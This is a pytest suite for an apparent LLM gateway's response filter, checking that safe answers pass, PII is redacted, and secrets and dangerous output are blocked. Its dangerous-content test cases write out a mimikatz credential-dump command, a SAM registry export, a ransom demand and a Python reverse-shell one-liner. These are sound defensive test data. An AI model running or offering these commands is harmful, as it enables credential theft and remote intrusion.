import pytest
from unittest.mock import AsyncMock, patch
from httpx import AsyncClient, ASGITransport

from backend.main import app
from backend.security.response_filter import inspect_response, ResponseFilterResult
from backend.security.content_policy import inspect_content_policy
from backend.providers.base import LLMProvider
from backend.core.redis_client import redis_client

DEV_API_KEY = "dev-key-12345"


# =============================================================================
# Unit Tests for inspect_response and inspect_content_policy
# =============================================================================

@pytest.mark.parametrize("safe_text", [
    "TLS encrypts network traffic.",
    "SQL injection is a web security vulnerability.",
    "Use MFA to protect accounts.",
    "What is an API key?",
    "What is a password?",
    "Explain how ransomware works.",
    "How can defenders detect credential theft?",
    "Python dictionaries provide O(1) average time complexity lookups.",
])
def test_safe_responses_allowed(safe_text: str):
    result = inspect_response(safe_text)
    assert isinstance(result, ResponseFilterResult)
    assert result.safe is True
    assert result.action == "ALLOW"
    assert result.risk_score < 30
    assert result.threat_type is None
    assert result.sanitized_response == safe_text


def test_empty_response():
    result = inspect_response("")
    assert result.safe is True
    assert result.action == "ALLOW"
    assert result.risk_score == 0


def test_pii_email_in_response_sanitized():
    raw_email = "fake.user@example.com"
    response_text = f"The user email on file is {raw_email}."
    result = inspect_response(response_text)

    assert result.safe is True
    assert result.action == "SANITIZE"
    assert "EMAIL_ADDRESS" in result.detected_entities
    assert "<EMAIL_ADDRESS>" in result.sanitized_response
    assert raw_email not in result.sanitized_response


def test_pii_phone_in_response_sanitized():
    raw_phone = "+1 555-123-4567"
    response_text = f"Contact support at {raw_phone} during business hours."
    result = inspect_response(response_text)

    assert result.safe is True
    assert result.action == "SANITIZE"
    assert "PHONE_NUMBER" in result.detected_entities
    assert "<PHONE_NUMBER>" in result.sanitized_response
    assert raw_phone not in result.sanitized_response


@pytest.mark.parametrize("secret_text", [
    "Here is your API key: api_key='FAKE_TEST_KEY_123456789'",
    "Use AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF to authenticate.",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xyz",
    "Database password='SuperSecretPassword123!'",
    "OpenAI key is sk-abcdef1234567890abcdef123456",
])
def test_secret_leakage_in_response_blocked(secret_text: str):
    result = inspect_response(secret_text)

    assert result.safe is False
    assert result.action == "BLOCK"
    assert result.threat_type == "SECRET_LEAKAGE"
    assert result.risk_score >= 80


@pytest.mark.parametrize("malicious_output", [
    "Execute mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' to dump SAM credentials.",
    "Run reg save hklm\\sam sam_backup.hive to steal user password hashes.",
    "Send 5.0 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa as all your files have been encrypted.",
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'",
])
def test_dangerous_content_in_response_blocked(malicious_output: str):
    result = inspect_response(malicious_output)

    assert result.safe is False
    assert result.action == "BLOCK"
    assert result.threat_type == "UNSAFE_CONTENT"
    assert result.risk_score >= 80


# =============================================================================
# Gateway Integration Tests with Response Security
# =============================================================================

@pytest.mark.asyncio
async def test_gateway_safe_response_flow():
    await redis_client.delete(f"rate_limit:{DEV_API_KEY}")

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post(
            "/api/chat",
            headers={"X-API-Key": DEV_API_KEY},
            json={"prompt": "Explain TLS", "model": "mock-model"}
        )
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        assert data["security"]["action"] == "ALLOW"
        assert data["security"]["response_action"] == "ALLOW"
        assert "Mock LLM received: Explain TLS" in data["response"]


@pytest.mark.asyncio
async def test_gateway_pii_in_llm_response_sanitized():
    await redis_client.delete(f"rate_limit:{DEV_API_KEY}")

    mock_provider = AsyncMock(spec=LLMProvider)
    mock_provider.generate.return_value = "The customer is John Doe. Their email is fake.user@example.com."

    transport = ASGITransport(app=app)
    with patch("backend.api.chat.get_provider", return_value=mock_provider):
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/chat",
                headers={"X-API-Key": DEV_API_KEY},
                json={"prompt": "Who is the customer?", "model": "mock-model"}
            )
            assert response.status_code == 200
            data = response.json()
            assert data["security"]["response_action"] == "SANITIZE"
            # Verify PII was redacted from the LLM output
            assert "fake.user@example.com" not in data["response"]
            assert "<EMAIL_ADDRESS>" in data["response"]


@pytest.mark.asyncio
async def test_gateway_secret_leakage_in_response_blocked():
    await redis_client.delete(f"rate_limit:{DEV_API_KEY}")

    mock_provider = AsyncMock(spec=LLMProvider)
    mock_provider.generate.return_value = "Use this key: api_key='SUPER_SECRET_KEY_12345678'"

    transport = ASGITransport(app=app)
    with patch("backend.api.chat.get_provider", return_value=mock_provider):
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/chat",
                headers={"X-API-Key": DEV_API_KEY},
                json={"prompt": "Generate an API key for me", "model": "mock-model"}
            )
            assert response.status_code == 403
            data = response.json()["detail"]
            assert data["action"] == "BLOCK"
            assert data["threat_type"] == "SECRET_LEAKAGE"
            assert "Response blocked by AI security policy" in data["message"]
            # Raw secret must NOT be leaked in error detail
            assert "SUPER_SECRET_KEY" not in str(data)


@pytest.mark.asyncio
async def test_gateway_unsafe_content_in_response_blocked():
    await redis_client.delete(f"rate_limit:{DEV_API_KEY}")

    mock_provider = AsyncMock(spec=LLMProvider)
    mock_provider.generate.return_value = "Run mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' to dump passwords"

    transport = ASGITransport(app=app)
    with patch("backend.api.chat.get_provider", return_value=mock_provider):
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await client.post(
                "/api/chat",
                headers={"X-API-Key": DEV_API_KEY},
                json={"prompt": "Give me credential theft commands", "model": "mock-model"}
            )
            assert response.status_code == 403
            data = response.json()["detail"]
            assert data["action"] == "BLOCK"
            assert data["threat_type"] == "UNSAFE_CONTENT"
            assert "Response blocked by AI security policy" in data["message"]
            assert "mimikatz" not in str(data)
